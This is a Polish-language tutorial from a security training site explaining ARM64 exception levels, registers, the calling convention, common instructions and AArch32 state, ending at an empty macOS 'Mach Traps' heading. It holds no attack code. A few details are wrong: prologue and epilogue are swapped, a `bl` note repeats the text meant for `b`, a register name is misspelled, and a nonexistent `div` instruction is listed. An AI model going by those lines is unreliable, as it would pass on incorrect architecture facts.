# Wprowadzenie do ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Exception Levels - EL (ARM64v8)**

W architekturze ARMv8 poziomy wykonywania, znane jako Exception Levels (EL), definiują poziom uprawnień i możliwości środowiska wykonawczego. Istnieją cztery poziomy wyjątków, od EL0 do EL3, z których każdy pełni inną rolę:

1. **EL0 - User Mode**:
- Jest to najmniej uprzywilejowany poziom i jest używany do wykonywania zwykłego kodu aplikacji.
- Aplikacje działające na EL0 są odizolowane od siebie nawzajem i od oprogramowania systemowego, co zwiększa bezpieczeństwo i stabilność.
2. **EL1 - Operating System Kernel Mode**:
- Większość jąder systemów operacyjnych działa na tym poziomie.
- EL1 ma więcej uprawnień niż EL0 i może uzyskiwać dostęp do zasobów systemowych, ale z pewnymi ograniczeniami w celu zachowania integralności systemu. Przejście z EL0 do EL1 odbywa się instrukcją SVC.
3. **EL2 - Hypervisor Mode**:
- Ten poziom jest używany do wirtualizacji. Hypervisor działający na EL2 może zarządzać wieloma systemami operacyjnymi (każdy na swoim EL1) uruchomionymi na tym samym sprzęcie fizycznym.
- EL2 zapewnia funkcje izolacji i kontroli środowisk wirtualizowanych.
- Aplikacje wirtualizacyjne, takie jak Parallels, mogą używać `hypervisor.framework` do interakcji z EL2 i uruchamiania maszyn wirtualnych bez potrzeby rozszerzeń jądra.
- Aby przejść z EL1 do EL2 używa się instrukcji `HVC`.
4. **EL3 - Secure Monitor Mode**:
- Jest to najbardziej uprzywilejowany poziom i często używany do secure boot oraz zaufanych środowisk wykonawczych.
- EL3 może zarządzać i kontrolować dostęp między stanami secure i non-secure (np. secure boot, trusted OS itp.).
- Był używany dla KPP (Kernel Patch Protection) w macOS, ale już nie jest stosowany.
- EL3 nie jest już używany przez Apple.
- Przejście do EL3 zazwyczaj odbywa się za pomocą instrukcji `SMC` (Secure Monitor Call).

Użycie tych poziomów pozwala na uporządkowany i bezpieczny sposób zarządzania różnymi aspektami systemu, od aplikacji użytkownika po najbardziej uprzywilejowane oprogramowanie systemowe. Podejście ARMv8 do poziomów uprawnień pomaga skutecznie izolować różne komponenty systemu, zwiększając tym samym bezpieczeństwo i odporność systemu.

## **Registers (ARM64v8)**

ARM64 ma **31 rejestrów ogólnego przeznaczenia**, oznaczonych `x0` do `x30`. Każdy może przechowywać wartość **64-bitową** (8 bajtów). Dla operacji wymagających jedynie wartości 32-bitowych te same rejestry można odczytywać w trybie 32-bitowym używając nazw `w0` do `w30`.

1. **`x0`** do **`x7`** - Zwykle używane jako rejestry tymczasowe i do przekazywania parametrów do podprocedur.
- **`x0`** także przenosi dane zwracane przez funkcję.
2. **`x8`** - W jądrze Linux `x8` jest używany jako numer wywołania systemowego dla instrukcji `svc`. **W macOS używany jest jednak x16!**
3. **`x9`** do **`x15`** - Kolejne rejestry tymczasowe, często używane dla zmiennych lokalnych.
4. **`x16`** i **`x17`** - **Intra-procedural Call Registers**. Tymczasowe rejestry dla wartości bezpośrednich. Są też używane dla wywołań pośrednich funkcji i stubów PLT (Procedure Linkage Table).
- **`x16`** jest używany jako **numer wywołania systemowego** dla instrukcji **`svc`** w **macOS**.
5. **`x18`** - **Platform register**. Może być używany jako rejestr ogólnego przeznaczenia, ale na niektórych platformach rejestr ten jest zarezerwowany dla zastosowań specyficznych dla platformy: wskaźnik do bieżącego bloku środowiska wątku w Windows lub wskaźnik do struktury wykonywanego zadania w jądrze linux.
6. **`x19`** do **`x28`** - Są to rejestry zapisywane przez callee. Funkcja musi zachować wartości tych rejestrów dla swojego wywołującego, więc są zapisywane na stosie i odzyskiwane przed powrotem do wywołującego.
7. **`x29`** - **Frame pointer** służący do śledzenia ramki stosu. Gdy tworzona jest nowa ramka stosu w wyniku wywołania funkcji, rejestr **`x29`** jest **zapisywany na stosie**, a **nowy** adres wskaźnika ramki (adres **`sp`**) jest **przechowywany w tym rejestrze**.
- Ten rejestr może także służyć jako **rejestr ogólnego przeznaczenia**, chociaż zwykle używa się go jako odniesienia do **zmiennych lokalnych**.
8. **`x30`** lub **`lr`** - **Link register**. Przechowuje **adres powrotu** po wykonaniu instrukcji `BL` (Branch with Link) lub `BLR` (Branch with Link to Register) poprzez zapisanie wartości **`pc`** w tym rejestrze.
- Może też być używany jak każdy inny rejestr.
- Jeśli bieżąca funkcja wywoła nową funkcję i w ten sposób nadpisze `lr`, to na początku zapisze go na stosie — to jest epilog (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Zapisz `fp` i `lr`, wygeneruj miejsce i ustaw nowy `fp`) i odzyska go na końcu — to jest prolog (`ldp x29, x30, [sp], #48; ret` -> Przywróć `fp` i `lr` i wróć).
9. **`sp`** - **Stack pointer**, używany do śledzenia szczytu stosu.
- wartość **`sp`** powinna zawsze być utrzymana co najmniej do wyrównania **quadword**, w przeciwnym razie może wystąpić wyjątek wyrównania.
10. **`pc`** - **Program counter**, który wskazuje na następną instrukcję. Ten rejestr może być aktualizowany jedynie przez generowanie wyjątków, powroty z wyjątków i rozgałęzienia. Jedynymi zwykłymi instrukcjami, które mogą odczytać ten rejestr, są instrukcje branch with link (BL, BLR), które zapisują adres **`pc`** w **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. Nazywany też **`wzr`** w jego 32-bitowej formie. Można go użyć do łatwego uzyskania wartości zero (częsta operacja) lub do wykonywania porównań używając **`subs`** jak **`subs XZR, Xn, #10`**, nie zapisując wyniku nigdzie (w **`xzr`**).

Rejestry **`Wn`** są 32-bitową wersją rejestru **`Xn`**.

> [!TIP]
> Rejestry od X0 do X18 są lotne, co oznacza, że ich wartości mogą się zmieniać podczas wywołań funkcji i przerwań. Natomiast rejestry od X19 do X28 są nielotne, co oznacza, że ich wartości muszą być zachowane przez wywołania funkcji ("callee saved").

### SIMD and Floating-Point Registers

Ponadto istnieje kolejnych **32 rejestrów o długości 128 bitów**, które mogą być używane w zoptymalizowanych operacjach SIMD (single instruction multiple data) oraz do wykonywania obliczeń zmiennoprzecinkowych. Nazywane są rejestrami Vn, chociaż mogą też działać w trybach **64**-bit, **32**-bit, **16**-bit i **8**-bit, wtedy nazywane są odpowiednio **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** i **`Bn`**.

### System Registers

**Istnieją setki rejestrów systemowych**, zwanych także rejestrami specjalnego przeznaczenia (SPRs), które służą do **monitorowania** i **kontrolowania** zachowania procesora.\
Można je odczytywać lub ustawiać tylko za pomocą specjalnych instrukcji **`mrs`** i **`msr`**.

Specjalne rejestry **`TPIDR_EL0`** i **`TPIDDR_EL0`** często pojawiają się podczas reverse engineeringu. Przyrostek `EL0` wskazuje minimalny poziom wyjątku, z którego rejestr może być dostępny (w tym przypadku EL0 to regularny poziom uprawnień, na którym działają zwykłe programy).\
Często są używane do przechowywania **adresu bazowego obszaru pamięci thread-local storage**. Zwykle pierwszy z nich jest czytelny i zapisywalny dla programów działających na EL0, ale drugi może być odczytywany z EL0 i zapisywany z EL1 (np. przez kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** zawiera kilka składników procesu zserializowanych w widocznym dla systemu operacyjnego specjalnym rejestrze **`SPSR_ELx`**, gdzie X to **poziom uprawnień wywołanego** wyjątku (pozwala to na odzyskanie stanu procesu po zakończeniu wyjątku).\
Dostępne pola to:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Flagi warunkowe **`N`**, **`Z`**, **`C`** i **`V`**:
- **`N`** oznacza, że operacja dała wynik ujemny
- **`Z`** oznacza, że operacja dała zero
- **`C`** oznacza, że wystąpiło przeniesienie (carry)
- **`V`** oznacza, że operacja spowodowała przepełnienie ze znakiem:
- Suma dwóch liczb dodatnich dała wynik ujemny.
- Suma dwóch liczb ujemnych dała wynik dodatni.
- Przy odejmowaniu, gdy od większej ujemnej liczby odejmowana jest mniejsza dodatnia (lub odwrotnie), a wynik nie mieści się w zakresie danego rozmiaru bitowego.
- Oczywiście procesor nie wie, czy operacja jest ze znakiem czy bez, więc sprawdza C i V w operacjach i wskazuje, czy wystąpiło przeniesienie w zależności od tego, czy operacja była interpretowana jako signed czy unsigned.

> [!WARNING]
> Nie wszystkie instrukcje aktualizują te flagi. Niektóre, jak **`CMP`** czy **`TST`**, to robią, oraz inne mające sufiks s jak **`ADDS`** również to robią.

- Bieżąca flaga szerokości rejestru (`nRW`): Jeśli flaga ma wartość 0, program będzie działał w stanie wykonawczym AArch64 po wznowieniu.
- Bieżący **Exception Level** (**`EL`**): Regularny program działający na EL0 będzie miał wartość 0.
- Flaga **single stepping** (**`SS`**): Używana przez debugery do pojedynczego kroku poprzez ustawienie flagi SS na 1 wewnątrz **`SPSR_ELx`** przez wyjątek. Program wykona krok i zgłosi wyjątek pojedynczego kroku.
- Flaga stanu nielegalnego wyjątku (**`IL`**): Używana do oznaczania, gdy uprzywilejowane oprogramowanie wykonuje nieprawidłową zmianę poziomu wyjątku; flaga ta ustawiana jest na 1 i procesor generuje wyjątek nielegalnego stanu.
- Flagi **`DAIF`**: Te flagi pozwalają uprzywilejowanemu programowi selektywnie maskować pewne zewnętrzne wyjątki.
- Jeśli **`A`** jest 1, oznacza to, że będą wyzwalane **asynchroniczne aborty**. Flaga **`I`** konfiguruje reakcję na zewnętrzne żądania przerwań (IRQs), a F odnosi się do **Fast Interrupt Requests** (FIRs).
- Flagi wyboru wskaźnika stosu (**`SPS`**): Programy uprzywilejowane działające na EL1 i wyżej mogą przełączać się pomiędzy używaniem własnego rejestru wskaźnika stosu a rejestrem modelu użytkownika (np. między `SP_EL1` i `EL0`). To przełączenie odbywa się poprzez zapis do specjalnego rejestru **`SPSel`**. Nie można tego zrobić z poziomu EL0.

## **Calling Convention (ARM64v8)**

Konwencja wywołań ARM64 określa, że **pierwsze osiem parametrów** funkcji przekazywane jest w rejestrach **`x0`** do **`x7`**. **Dodatkowe** parametry przekazywane są na **stosie**. **Wartość zwracana** przekazywana jest w rejestrze **`x0`**, lub także w **`x1`** jeśli ma **128 bitów**. Rejestry **`x19`** do **`x30`** oraz **`sp`** muszą być **zachowane** podczas wywołań funkcji.

Czytając funkcję w asemblerze, szukaj **prologu i epilogu funkcji**. **Prolog** zwykle polega na **zapisaniu wskaźnika ramki (`x29`)**, **ustawieniu nowego wskaźnika ramki** oraz **alokacji miejsca na stosie**. **Epilog** zwykle polega na **przywróceniu zapisanego wskaźnika ramki** i **powrocie** z funkcji.

### Calling Convention in Swift

Swift ma własną **konwencję wywołań**, którą można znaleźć w [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Common Instructions (ARM64v8)**

Instrukcje ARM64 mają zazwyczaj **format `opcode dst, src1, src2`**, gdzie **`opcode`** to operacja do wykonania (np. `add`, `sub`, `mov` itp.), **`dst`** to rejestr docelowy, w którym zapisany zostanie wynik, a **`src1`** i **`src2`** to rejestry źródłowe. W miejsce rejestrów źródłowych można też użyć wartości natychmiastowych.

- **`mov`**: **Move** wartość z jednego **rejestru** do drugiego.
- Przykład: `mov x0, x1` — Przenosi wartość z `x1` do `x0`.
- **`ldr`**: **Load** wartość z **pamięci** do **rejestru**.
- Przykład: `ldr x0, [x1]` — Ładuje wartość spod adresu wskazywanego przez `x1` do `x0`.
- **Tryb offsetu**: Offset wpływający na adres źródłowy jest wskazany, na przykład:
- `ldr x2, [x1, #8]`, to załaduje do x2 wartość z adresu x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, to załaduje do x2 obiekt z tablicy x0, z pozycji x1 (index) * 4
- **Tryb pre-indeksowany**: Obliczenia są zastosowane do pochodzenia, wynik jest pobierany i nowy adres jest zapisany z powrotem do rejestru źródłowego.
- `ldr x2, [x1, #8]!`, to załaduje `x1 + 8` do `x2` i zapisze w x1 wynik `x1 + 8`
- `str lr, [sp, #-4]!`, Zapisz link register do sp i zaktualizuj rejestr sp
- **Tryb post-index**: Podobny do poprzedniego, ale adres pamięci jest najpierw użyty, a następnie offset jest obliczany i zapisany.
- `ldr x0, [x1], #8`, załaduj z x1 do x0 i zaktualizuj x1 dodając `#8`
- **Adresowanie względem PC**: W tym przypadku adres do załadowania jest obliczany względem rejestru PC
- `ldr x1, =_start`, To załaduje do x1 adres symbolu `_start` względem bieżącego PC.
- **`str`**: **Store** wartość z **rejestru** do **pamięci**.
- Przykład: `str x0, [x1]` — Zapisuje wartość z `x0` do pamięci pod adresem wskazywanym przez `x1`.
- **`ldp`**: **Load Pair of Registers**. Instrukcja ładuje **dwa rejestry** z **kolejnych miejsc pamięci**. Adres pamięci zwykle tworzony jest przez dodanie offsetu do wartości w innym rejestrze.
- Przykład: `ldp x0, x1, [x2]` — Ładuje `x0` i `x1` z miejsc pamięci o adresach `x2` i `x2 + 8`.
- **`stp`**: **Store Pair of Registers**. Instrukcja zapisuje **dwa rejestry** do **kolejnych miejsc pamięci**. Adres pamięci zwykle tworzony jest przez dodanie offsetu do wartości w innym rejestrze.
- Przykład: `stp x0, x1, [sp]` — Zapisuje `x0` i `x1` do pamięci pod adresami `sp` i `sp + 8`.
- `stp x0, x1, [sp, #16]!` — Zapisuje `x0` i `x1` do pamięci pod `sp+16` i `sp + 24`, oraz aktualizuje `sp` do `sp+16`.
- **`add`**: **Dodaje** wartości dwóch rejestrów i zapisuje wynik w rejestrze.
- Składnia: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destynacja
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (rejestr lub immediate)
- \[shift #N | RRX] -> Wykonaj przesunięcie lub RRX
- Przykład: `add x0, x1, x2` — Dodaje wartości z `x1` i `x2` i zapisuje wynik w `x0`.
- `add x5, x5, #1, lsl #12` — To odpowiada 4096 (1 przesunięte 12 razy) -> 1 0000 0000 0000 0000
- **`adds`**: Wykonuje `add` i aktualizuje flagi
- **`sub`**: **Odejmuje** wartości dwóch rejestrów i zapisuje wynik w rejestrze.
- Zobacz składnię **`add`**.
- Przykład: `sub x0, x1, x2` — Odejmuje wartość w `x2` od `x1` i zapisuje wynik w `x0`.
- **`subs`**: Jak `sub`, ale aktualizuje flagi
- **`mul`**: **Mnoży** wartości dwóch rejestrów i zapisuje wynik w rejestrze.
- Przykład: `mul x0, x1, x2` — Mnoży wartości w `x1` i `x2` i zapisuje wynik w `x0`.
- **`div`**: **Dzieli** wartość jednego rejestru przez drugi i zapisuje wynik w rejestrze.
- Przykład: `div x0, x1, x2` — Dzieli wartość w `x1` przez `x2` i zapisuje wynik w `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Dodaje zera na końcu przesuwając bity do przodu (mnożenie przez 2^n)
- **Logical shift right**: Dodaje zera na początku przesuwając bity wstecz (dzielenie przez 2^n dla liczb bez znaku)
- **Arithmetic shift right**: Jak **`lsr`**, ale zamiast dodawać zera, jeśli najbardziej znaczący bit jest 1, dodawane są jedynki (dzielenie przez 2^n dla liczb ze znakiem)
- **Rotate right**: Jak **`lsr`**, ale to, co jest usuwane z prawej, jest dołączane z lewej
- **Rotate Right with Extend**: Jak **`ror`**, ale z flaga carry jako "najbardziej znaczący bit". Flaga carry jest przesuwana na bit 31, a usunięty bit trafia do flagi carry.
- **`bfm`**: **Bit Filed Move**, operacje kopiują bity `0...n` z wartości i umieszczają je na pozycjach **`m..m+n`**. **`#s`** określa pozycję najbardziej lewej wartości bitu, a **`#r`** ilość rotacji w prawo.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Kopiuje pole bitowe z rejestru i wstawia je do innego rejestru.
- **`BFI X1, X2, #3, #4`** Wstaw 4 bity z X2 zaczynając od 3. bitu do X1
- **`BFXIL X1, X2, #3, #4`** Wyodrębnij z 3. bitu X2 cztery bity i skopiuj je do X1
- **`SBFIZ X1, X2, #3, #4`** Rozszerza znak 4 bitów z X2 i wstawia je do X1 zaczynając od pozycji bitu 3, zerując bity z prawej
- **`SBFX X1, X2, #3, #4`** Wyodrębnia 4 bity zaczynając od bitu 3 z X2, rozszerza znak i umieszcza wynik w X1
- **`UBFIZ X1, X2, #3, #4`** Zero-rozszerza 4 bity z X2 i wstawia je do X1 zaczynając od bitu 3, zerując bity z prawej
- **`UBFX X1, X2, #3, #4`** Wyodrębnia 4 bity zaczynając od bitu 3 z X2 i zapisuje zero-rozszerzony wynik w X1.
- **Sign Extend To X:** Rozszerza znak (lub po prostu dodaje zera w wersji unsigned) wartości, aby móc wykonywać operacje z nią:
- **`SXTB X1, W2`** Rozszerza znak bajtu **z W2 do X1** (`W2` jest połową `X2`) aby wypełnić 64 bity
- **`SXTH X1, W2`** Rozszerza znak 16-bitowej liczby **z W2 do X1** aby wypełnić 64 bity
- **`SXTW X1, W2`** Rozszerza znak **z W2 do X1** aby wypełnić 64 bity
- **`UXTB X1, W2`** Dodaje zera (wersja unsigned) dla bajtu **z W2 do X1** aby wypełnić 64 bity
- **`extr`**: Wyodrębnia bity z określonej pary rejestrów połączonych razem.
- Przykład: `EXTR W3, W2, W1, #3` To połączy W1+W2 i weźmie **od bitu 3 W2 do bitu 3 W1** i zapisze do W3.
- **`cmp`**: **Porównuje** dwa rejestry i ustawia flagi warunkowe. Jest aliasem `subs`, ustawiając rejestr docelowy na rejestr zerowy. Przydatne, gdy chcesz sprawdzić czy `m == n`.
- Obsługuje tę samą składnię co `subs`
- Przykład: `cmp x0, x1` — Porównuje wartości w `x0` i `x1` i ustawia odpowiednio flagi warunkowe.
- **`cmn`**: **Compare negative** operand. W tym przypadku jest aliasem `adds` i obsługuje tę samą składnię. Przydatne, gdy chcesz sprawdzić czy `m == -n`.
- **`ccmp`**: Warunkowe porównanie, jest to porównanie które zostanie wykonane tylko jeśli poprzednie porównanie było prawdziwe i specjalnie ustawi bity nzcv.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> jeśli x1 != x2 i x3 < x4, skocz do func
- Dzieje się tak ponieważ **`ccmp`** zostanie wykonane tylko jeśli poprzedni `cmp` był `NE`; jeśli nie był, bity `nzcv` zostaną ustawione na 0 (co nie spełni warunku `blt`).
- To może być też użyte jako `ccmn` (to samo, ale negatywne, jak `cmp` vs `cmn`).
- **`tst`**: Sprawdza, czy któreś z bitów porównania są ustawione na 1 (działa jak ANDS bez zapisywania wyniku). Przydatne do sprawdzenia rejestru z maską i zweryfikowania, czy którykolwiek z bitów wskazanych w masce jest 1.
- Przykład: `tst X1, #7` Sprawdź czy któryś z ostatnich 3 bitów X1 jest 1
- **`teq`**: Operacja XOR odrzucająca wynik
- **`b`**: Bezwarunkowe rozgałęzienie
- Przykład: `b myFunction`
- Zauważ, że to nie wypełni link register adresem powrotu (nie nadaje się do wywołań podprocedur, które muszą wrócić)
- **`bl`**: **Branch** z linkiem, używane do **wywołania** podprogramu. Zapisuje **adres powrotu w `x30`**.
- Przykład: `bl myFunction` — Wywołuje `myFunction` i zapisuje adres powrotu w `x30`.
- Uwaga: (powtórzone w oryginale) Note that this won't fill the link register with the return address (not suitable for subrutine calls that needs to return back)
- **`blr`**: **Branch** with Link to Register, używane do wywołania podprogramu, gdzie cel jest podany w rejestrze. Zapisuje adres powrotu w `x30`.
- Przykład: `blr x1` — Wywołuje funkcję, której adres znajduje się w `x1` i zapisuje adres powrotu w `x30`.
- **`ret`**: **Return** z podprogramu, zazwyczaj używając adresu w **`x30`**.
- Przykład: `ret` — Zwraca z bieżącego podprogramu używając adresu powrotu w `x30`.
- **`b.<cond>`**: Warunkowe rozgałęzienia
- **`b.eq`**: **Skocz jeśli równe**, na podstawie poprzedniej instrukcji `cmp`.
- Przykład: `b.eq label` — Jeśli poprzedni `cmp` wykazał równość, skocz do `label`.
- **`b.ne`**: **Skocz jeśli nie równe**. Ta instrukcja sprawdza flagi warunkowe (ustawione przez poprzednie porównanie) i jeśli wartości nie były równe, skacze do etykiety lub adresu.
- Przykład: Po `cmp x0, x1` instrukcja `b.ne label` — jeśli wartości w `x0` i `x1` nie były równe, skocz do `label`.
- **`cbz`**: **Compare and Branch on Zero**. Porównuje rejestr z zerem, a jeśli są równe, skacze do etykiety lub adresu.
- Przykład: `cbz x0, label` — Jeśli wartość w `x0` jest zero, skocz do `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Porównuje rejestr z zerem, a jeśli są różne, skacze do etykiety lub adresu.
- Przykład: `cbnz x0, label` — Jeśli wartość w `x0` nie jest zero, skocz do `label`.
- **`tbnz`**: Test bit i skocz jeśli niezerowy
- Przykład: `tbnz x0, #8, label`
- **`tbz`**: Test bit i skocz jeśli zerowy
- Przykład: `tbz x0, #8, label`
- **Operacje wyboru warunkowego**: Operacje, których zachowanie zależy od bitów warunkowych.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Jeśli prawda, X0 = X1, jeśli fałsz, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = Xn, jeśli fałsz, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Jeśli prawda, Xd = Xn + 1, jeśli fałsz, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = Xn, jeśli fałsz, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Jeśli prawda, Xd = NOT(Xn), jeśli fałsz, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = Xn, jeśli fałsz, Xd = - Xm
- `cneg Xd, Xn, cond` -> Jeśli prawda, Xd = - Xn, jeśli fałsz, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = 1, jeśli fałsz, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = \<all 1>, jeśli fałsz, Xd = 0
- **`adrp`**: Oblicza **adres strony symbolu** i zapisuje go w rejestrze.
- Przykład: `adrp x0, symbol` — Oblicza adres strony symbolu `symbol` i zapisuje go w `x0`.
- **`ldrsw`**: **Ładuje** znakowaną **32-bitową** wartość z pamięci i **rozszerza ją znakowo do 64 bitów**. Używane często w instrukcjach SWITCH.
- Przykład: `ldrsw x0, [x1]` — Ładuje znakowaną 32-bitową wartość spod adresu wskazanego przez `x1`, rozszerza ją do 64 bitów i zapisuje w `x0`.
- **`stur`**: **Zapisuje wartość rejestru do pamięci**, używając offsetu od innego rejestru.
- Przykład: `stur x0, [x1, #4]` — Zapisuje wartość z `x0` do miejsca w pamięci o adresie `x1 + 4`.
- **`svc`** : Wykonuje **wywołanie systemowe**. Oznacza "Supervisor Call". Gdy procesor wykona tę instrukcję, **przełącza się z trybu użytkownika do trybu jądra** i skacze do określonego miejsca w pamięci, gdzie znajduje się kod obsługi wywołań systemowych jądra.

- Przykład:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Zapisz link register i frame pointer na stosie**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Ustaw nowy wskaźnik ramki**: `mov x29, sp` (ustawia nowy wskaźnik ramki dla bieżącej funkcji)
3. **Zarezerwuj miejsce na stosie dla zmiennych lokalnych** (jeśli potrzebne): `sub sp, sp, <size>` (gdzie `<size>` to liczba bajtów potrzebna)

### **Epilog funkcji**

1. **Zwolnij pamięć dla zmiennych lokalnych (jeśli zostały przydzielone)**: `add sp, sp, <size>`
2. **Przywróć rejestr linku i wskaźnik ramki**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (zwraca kontrolę do wywołującego, używając adresu w link register)

## ARM Common Memory Protections

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 Execution State

Armv8-A obsługuje wykonywanie programów 32-bitowych. **AArch32** może działać w jednym z **dwóch zestawów instrukcji**: **`A32`** i **`T32`** i może przełączać się między nimi za pomocą **`interworking`**.\
**Uprzywilejowane** programy 64-bitowe mogą uruchomić wykonywanie programów 32-bitowych, wykonując transfer poziomu wyjątków do mniej uprzywilejowanego 32-bitowego trybu.\
Zauważ, że przejście z 64-bitowego do 32-bitowego następuje przy niższym poziomie wyjątków (na przykład program 64-bitowy w EL1 wywołujący program w EL0). Odbywa się to przez ustawienie **bitu 4 w** specjalnym rejestrze **`SPSR_ELx`** **na 1**, gdy wątek procesu `AArch32` jest gotowy do wykonania, a pozostała część `SPSR_ELx` przechowuje CPSR programu **`AArch32`**. Następnie uprzywilejowany proces wykonuje instrukcję **`ERET`**, dzięki czemu procesor przechodzi do **`AArch32`**, wchodząc w A32 lub T32 zależnie od CPSR**.**

The **`interworking`** occurs using the J and T bits of CPSR. `J=0` and `T=0` means **`A32`** and `J=0` and `T=1` means **T32**. This basically traduces on setting the **lowest bit to 1** to indicate the instruction set is T32.\
This is set during the **interworking branch instructions,** but can also be set directly with other instructions when the PC is set as the destination register. Example:

Another example:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Rejestry

Istnieje 16 32-bitowych rejestrów (r0-r15). **Od r0 do r14** można ich używać do **dowolnych operacji**, jednak niektóre z nich są zwykle zarezerwowane:

- **`r15`**: licznik rozkazów (Program counter). Zawiera adres następnej instrukcji. W A32 current + 8, w T32 current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (Uwaga: stos jest zawsze wyrównany do 16 bajtów)
- **`r14`**: Link Register

Ponadto rejestry są zapisywane w **`banked registries`**. Są to miejsca, które przechowują wartości rejestrów, umożliwiając **szybkie przełączanie kontekstu** podczas obsługi wyjątków i operacji uprzywilejowanych, co pozwala uniknąć ręcznego zapisywania i przywracania rejestrów za każdym razem.\
Odbywa się to przez **zapisanie stanu procesora z `CPSR` do `SPSR`** trybu procesora, do którego jest przejmowany wyjątek. Przy powrocie z wyjątku **`CPSR`** jest przywracany z **`SPSR`**.

### CPSR - Rejestr stanu programu (Current Program Status Register)

W AArch32 CPSR działa podobnie jak **`PSTATE`** w AArch64 i jest również zapisywany w **`SPSR_ELx`**, gdy zostanie przejęty wyjątek, aby później przywrócić wykonanie:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Pola są podzielone na kilka grup:

- Rejestr stanu programu aplikacji (APSR): flagi arytmetyczne i dostępny z EL0
- Execution State Registers: zachowanie procesu (zarządzane przez OS).

#### Rejestr stanu programu aplikacji (APSR)

- Flagi **`N`**, **`Z`**, **`C`**, **`V`** (tak jak w AArch64)
- Flaga **`Q`**: jest ustawiana na 1 zawsze, gdy podczas wykonywania specjalnej instrukcji arytmetycznej saturującej wystąpi **saturacja typu całkowitoliczbowego**. Po ustawieniu na **`1`** zachowuje tę wartość, dopóki nie zostanie ręcznie ustawiona na 0. Ponadto nie ma żadnej instrukcji, która implicitnie sprawdza jej wartość — trzeba ją odczytać ręcznie.
- Flagi **`GE`** (Greater than or equal): używane w operacjach SIMD (Single Instruction, Multiple Data), takich jak "parallel add" i "parallel subtract". Operacje te pozwalają przetwarzać wiele elementów danych w ramach pojedynczej instrukcji.

Na przykład instrukcja **`UADD8`** **dodaje cztery pary bajtów** (z dwóch operandów 32-bitowych) równolegle i zapisuje wyniki w rejestrze 32-bitowym. Następnie **ustawia flagi `GE` w `APSR`** w oparciu o te wyniki. Każda flaga GE odpowiada jednej z dodawanych par bajtów i wskazuje, czy dodawanie dla tej pary bajtów **przepełniło się**.

Instrukcja **`SEL`** wykorzystuje te flagi GE do wykonywania warunkowych operacji.

#### Rejestry stanu wykonania

- Bity **`J`** i **`T`**: **`J`** powinien być 0; jeśli **`T`** ma wartość 0, używany jest zestaw instrukcji A32, a jeśli 1 — T32.
- **IT Block State Register** (`ITSTATE`): to bity z zakresu 10–15 i 25–26. Przechowują warunki dla instrukcji wewnątrz grupy poprzedzonej **`IT`**.
- Bit **`E`**: wskazuje kolejność bajtów (endianness).
- Bity trybu i maski wyjątków (0–4): określają bieżący stan wykonania. Piąty bit wskazuje, czy program działa jako 32-bitowy (1) czy 64-bitowy (0). Pozostałe cztery reprezentują **tryb wyjątków aktualnie używany** (gdy wystąpi wyjątek i jest obsługiwany). Ustawiona liczba **określa bieżący priorytet** na wypadek, gdyby w trakcie obsługi pojawił się kolejny wyjątek.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Niektóre wyjątki można wyłączyć za pomocą bitów **`A`**, `I`, `F`. Jeśli **`A`** jest 1, oznacza to, że będą wyzwalane **asynchronous aborts**. Bit **`I`** konfiguruje obsługę zewnętrznych żądań przerwań sprzętowych (Interrupt Requests, IRQs). Natomiast F dotyczy **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Sprawdź [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) lub uruchom `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls będą miały **x16 > 0**.

### Mach Traps

